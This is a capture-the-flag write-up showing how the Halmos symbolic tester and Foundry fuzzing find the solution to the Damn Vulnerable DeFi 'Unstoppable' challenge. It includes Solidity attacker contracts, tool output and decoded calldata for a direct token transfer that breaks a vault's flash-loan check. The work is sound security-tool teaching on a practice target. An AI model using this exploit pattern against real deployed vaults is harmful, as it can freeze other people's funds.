# Halmos vs Unstoppable 
## Halmos version
**halmos 0.2.1.dev16+g1502e46** was used in this article
## Idea overview
Let's imagine that we don't know how to solve this challenge. The only things we know are the code of contracts, pre-written "setUp()" function, final state we must achieve and the "test_unstoppable()" function, where we should write our solution.
The idea is:
1. Create some "SymbolicAttacker" contract, controlled by player and give it all necessary resources (DamnValuableToken supply).

2. SymbolicAttacker should be able to symbolically execute all known contracts with all possible parameters to find necessary state.

3. In "_isSolved()" function, write an assert opposite to the existing one. That means, if there is:
    ```javascript
    assertTrue(*Some condition*);
    ```
    we will change it to:
    ```javascript
    assertFalse(*Some condition*);
    ```
    so Halmos will find a counterexample where this condition is true. This will be our solution for the challenge.

4. Paste this counterexample into the initial code and execute **forge test**.

5. **forge test** should be passed.
## Common prerequisites
1. Copy Unstoppable.t.sol file to Unstoppable_Halmos.t.sol. All Halmos-related changes should be done here.

2. Since Halmos doesn't support 
    ```
    vm.expectEmit()
    ```
    cheatcode, we simply delete this code.

3. Rename **"test_unstoppable()"** to **"check_unstoppable()"**, so Halmos will execute this test symbolically.
4. Since Halmos doesn't support the next cheatcode, it should be replaced:
    ```
    vm.startPrank(player, player);
    ```
    by
    ```
    vm.startPrank(player);
    ```
5. We should avoid using the makeAddr() cheatcode, because Halmos treats such addresses as symbolic, leading to incorrect counterexamples. Simply put, Halmos can assume that the deployer and the player have the same addresses (is the same person), which destroys the very essence of the challenge. So we have to replace makeAddr() with specific hardcoded values:
    ```javascript
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    ```
    by
    ```javascript
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    ```
6. Halmos execution should be done without timeout assertion:
    ```
    halmos <...> --solver-timeout-assertion 0
    ```


## Deploying SymbolicAttacker contract
So, let's write our "check_unstoppable()" function:
```javascript
function  check_unstoppable() public  checkSolvedByPlayer {
    SymbolicAttacker attacker =  new SymbolicAttacker(); // Deploy attacker contract
    token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE); // Transfer necessary resources to attacker
    attacker.attack(); // execute symbolic attack
}
```
Pretty simple so far.
## SymbolicAttacker implementation
First of all, it should support symbolic execution and common forge cheatcodes. So let's import the necessary stuff:
```javascript
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "../../lib/halmos-cheatcodes/src/SymTest.sol";
import "forge-std/Test.sol";
```

Since the basis of our idea is the symbolic execution of some transaction, which, as we assume, leads to a bug, the implementation of the attacking function looks like this:
```javascript
contract SymbolicAttacker is Test, SymTest {
	function attack() public {
        address target = svm.createAddress("target");
        bytes memory data = svm.createBytes(100, 'data');
        target.call(data);
    }
}
```
Let's break down the attack() function line by line:
1. Since we don't know which contract call is causing the bug, we work with target as some symbolic address
    ```javascript
    address target = svm.createAddress("target");
    ```
2. The situation is similar here - we do not know which function of the contract and with which parameters it should be called to trigger the bug, so we work with calldata as with symbolic values.
    ```javascript
    bytes memory data = svm.createBytes(100, 'data');
    ```
3. Finally, we got to the place where all the magic happens:
If you make a call to the symbolic address, Halmos will automatically process all known contracts by brute force. In this case, these are **DamnValuableToken**, **UnstoppableVault**, **UnstoppableMonitor** and, unexpectedly, **SymbolicAttacker** himself (we'll come back to this later). 
    Accordingly, the symbolic calldata **data** will also be bruteforced as all possible entry points of contracts with corresponding symbolic parameters.
    ```javascript
    target.call(data);
    ```

## _isSolved() implementation and counterexample
This function is a check function that is executed immediately after “check_unstoppable()”. The attacker has finished it's work, so it's time to check the state and create a counterexample.
The original checks look like:
```javascript
function  _isSolved() private {
    ...
    // And now the monitor paused the vault and transferred ownership to deployer
    assertTrue(vault.paused(), "Vault is not paused");
    assertEq(vault.owner(), deployer, "Vault did not change owner");
}
```
Then the opposite check will look like this:
```javascript
function  _isSolved() private {
    ...
    assert(vault.paused() == false || vault.owner() != deployer);
}
```
Finally, execute it:
```javascript
~$ halmos --function check_unstoppable --solver-timeout-assertion 0
...
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
Counterexample:
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
WARNING:halmos:Counterexample (potentially invalid):
halmos_data_bytes_2658b5c_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0002
(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
WARNING:halmos:Counterexample (potentially invalid):
halmos_data_bytes_2658b5c_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0002
(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
WARNING:halmos:Counterexample (potentially invalid):
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000007f3ffce4e8f1c0000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
WARNING:halmos:Counterexample (potentially invalid):
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000007f3ffce4e8f1c0000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
WARNING:halmos:Counterexample (potentially invalid):
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_9d914dc_06 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000804013125f0000000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0005
halmos_target_address_d348a8b_05 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
WARNING:halmos:Counterexample (potentially invalid):
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_9d914dc_06 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000804013125f0000000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0005
halmos_target_address_d348a8b_05 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
(see https://github.com/a16z/halmos/wiki/warnings#counterexample-invalid)
....
```
Hooray! We received a number of very similar counterexamples. They appear one after another, so I had to stop the analysis process at some point. Let's analyze what happened here.
## Counterexamples analysis
### Dealing with multiple counterexamples
First of all, let's add logging to the beginning of the test execution. Let's look at the addresses of each of the deployed contracts:
```javascript
function check_unstoppable() public  checkSolvedByPlayer {
        SymbolicAttacker attacker =  new SymbolicAttacker(); // Deploy attacker contract
        console.log("token\t", address(token));
        console.log("vault\t", address(vault));
        console.log("monitor\t", address(monitorContract));
        console.log("attacker\t", address(attacker));
        ...
```
And run again:
```javascript
~$ halmos --function check_unstoppable --solver-timeout-assertion 0
...
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] vault      0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] monitor    0x00000000000000000000000000000000000000000000000000000000aaaa0004
[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005         
```
Now we have address information. Let's briefly look at the first 2 counterexamples (they are identical):
```javascript
halmos_data_bytes_2658b5c_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0002    
```
Here the attacker executed some transaction on the token contract, which led to the bug. Before studying it in more depth, it is necessary to consider other counterexamples:
```javascript
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa00030000000000000000000000000000000000000000000000007f3ffce4e8f1c0000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005  
```
and
```javascript
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_8a799d8_04 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
halmos_data_bytes_9d914dc_06 =
0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000804013125f0000000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0005
halmos_target_address_d348a8b_05 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
```
Given that we already know that **0x0...aaaa0005** is the attacker's address, it is easy to guess that we are dealing with recursion. attacker calls its own attack() function and thus inflates the analysis with garbage counterexamples. Fixing this is quite simple - just use the vm.assume() cheat code when creating a symbolic address:
```javascript
function attack() public {
        address target = svm.createAddress("target");
        vm.assume (target != address(this)); // Avoid recursion
        ...
```
Now we've gotten rid of the trashy recursive counterexamples and have only meaningful one.

### Calldata analysis

We already know that the attack is based on some transaction to the token address. Let's break down this calldata brick by brick:
```javascript
0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
```
The first 4 bytes (a9059cbb) are the selector of some token function. It is easy to find out which selector it is. It is enough to look at the compiler artifacts in the file **out/DamnValuableToken.sol/DamnValuableToken.json** and enter this selector in the search:
```json
...,"transfer(address,uint256)":"a9059cbb",...
```
This is just a transfer function.
The parameters of this function are also simple:
```javascript
00000000000000000000000000000000000000000000000000000000aaaa0003
```
Obviously, this is the address of the vault contract.
The remaining bytes are the amount that we pass to the transfer function:
```javascript
000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
```
0s in the end is padding. Since we generated 100 symbolic bytes, it generates 0s padding. We can leave it as is.
As a result, we clarified everything: Attacker sends some tokens to vault contract and it should lead to flashloan error.
## Using of counterexample 
First of all, let's find all contract addresses in **forge**. We'll use the same console logging here and this is what we got:
```javascript
~$ forge test -vv --mp test/unstoppable/Unstoppable.t.sol
...
Logs:
token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
vault          0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
monitor        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5
  ...
```
Implement non-symbolic attacker contract:
```javascript

pragma solidity =0.8.25;

import "../../lib/halmos-cheatcodes/src/SymTest.sol";
import "forge-std/Test.sol";

contract Attacker is Test, SymTest {
	function attack() public {
        address target = address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b);
        bytes memory data = hex"a9059cbb0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000";
        target.call(data);
    }
}
```
This is an exact copy of SymbolicAttacker, except we've replaced the symbolic values with concrete values ​​from the counterexample. 
And of course, we replaced the addresses from Halmos with Foundry addresses.
And test_unstoppable():
```javascript
function test_unstoppable() public checkSolvedByPlayer {
        Attacker attacker = new Attacker();
        token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE);
        attacker.attack();
    }
```
Let's execute:
```javascript
forge test -vv --mp test/unstoppable/Unstoppable.t.sol
...
Ran 2 tests for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
[PASS] test_assertInitialState() (gas: 57390)
[PASS] test_unstoppable() (gas: 899808)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.56ms 
Ran 1 test suite in 37.58ms (1.56ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests) 
```
Success! The challenge "Unstoppable" is solved successfully using Halmos symbolic testing.

## And what about fuzzing?
At the time of writing, [Echidna-driven](https://github.com/crytic/damn-vulnerable-defi-echidna/blob/solutions/contracts/unstoppable/UnstoppableEchidna.sol) solution by Crytic team and [Foundry-driven](https://github.com/devdacian/solidity-fuzzing-comparison/blob/main/test/02-unstoppable/UnstoppableBasicFoundry.t.sol) solution by devdacian can be found on the Internet. However, these solutions were made for older versions of Unstoppable. The current version needs to check other invariants, so we will work with a modernized solution. Of course, I chose invariant-driven Foundry as my fuzzing engine since the current version of Damn-Vulnerable-Defi was completely rewritten on Foundry. 
### Invariant
The invariant is obvious - I just took the code of the **_isSolved()** function from **Unstoppable_Halmos.t.sol** and used it:
```javascript
function invariant_check_flash_loan() public {
    vm.prank(deployer);
    monitorContract.checkFlashLoan(100e18);
    // Foundry should generate counterexample here.
    // We expect it to find such a contract and data that sets the vault paused.
    assert(vault.paused() == false || vault.owner() != deployer);
}
```
### SetUp()
And the **SetUp()** was changed somewhat, where it was indicated that the attacking actor is only the player, and fuzzing is performed on all known contracts:
```javascript
function setUp() public {
...
    vm.stopPrank();
    targetSender(player);
    targetContract(address(token));
    targetContract(address(vault));
    targetContract(address(monitorContract));
}
```
### Fuzzing result
Let's launch our Unstoppable, changed to fuzzing:
```javascript
~$ forge test -vvv --mp test/unstoppable/Unstoppable_Fuzz.t.sol
...
[FAIL: invariant_check_flash_loan replay failure]
[Sequence]
sender=0x44E97aF4418b7a17AABD8090bEA0A471a366305C addr=[src/DamnValuableToken.sol:DamnValuableToken]0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b calldata=transfer(address,uint256) args=[0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, 1725540768 [1.725e9]]
...
```
This method also quickly and simply found the attacking transaction.
## Conclusions
1. We proved that Halmos can be used to solve CTF problems. We had a simple one-transaction challenge and Halmos solved it in a rather intuitive and understandable way
2. Analyzing counterexamples can be tricky due to hard-coded addresses and parameters. We can't just put a counterexample in the source code and expect it to behave like it does inside Halmos
3. When we try to migrate a normal Foundry test to Halmos, we need to be careful not to use unsupported functionality from Foundry, or tricky cheat codes like makeAddr()
4. Getting into recursion should be avoided as it can lead to garbage counterexamples or truncate code coverage
5. In the case of fairly simple problems with a trivial solution, the solution through fuzzing looks and is much simpler: writing it took ten times less time and effort than solving through Halmos. However, **!!!SPOILER ALERT!!!**, Halmos will show his power in the following less trivial challenges
